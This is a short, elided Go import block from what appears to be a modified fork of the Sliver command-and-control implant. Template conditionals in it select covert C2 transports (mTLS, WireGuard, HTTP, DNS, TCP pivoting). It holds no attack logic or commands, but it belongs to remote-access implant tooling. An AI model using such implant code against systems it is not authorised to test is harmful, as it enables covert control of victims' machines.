...
import (
	...
	"github.com/B0lg0r0v/sliver_modified/implant/sliver/transports/mtls"
	...
	"github.com/B0lg0r0v/sliver_modified/implant/sliver/transports/wireguard"
	"golang.zx2c4.com/wireguard/device"

	// {{end}}

	// {{if .Config.HTTPc2Enabled}}
	"github.com/B0lg0r0v/sliver_modified/implant/sliver/transports/httpclient"
	// {{end}}

	// {{if .Config.DNSc2Enabled}}
	"github.com/B0lg0r0v/sliver_modified/implant/sliver/transports/dnsclient"
	// {{end}}

	// {{if .Config.TCPPivotc2Enabled}}
	"github.com/B0lg0r0v/sliver_modified/implant/sliver/transports/pivotclients"
	...
	pb "github.com/B0lg0r0v/sliver_modified/protobuf/sliverpb"
	// {{end}}
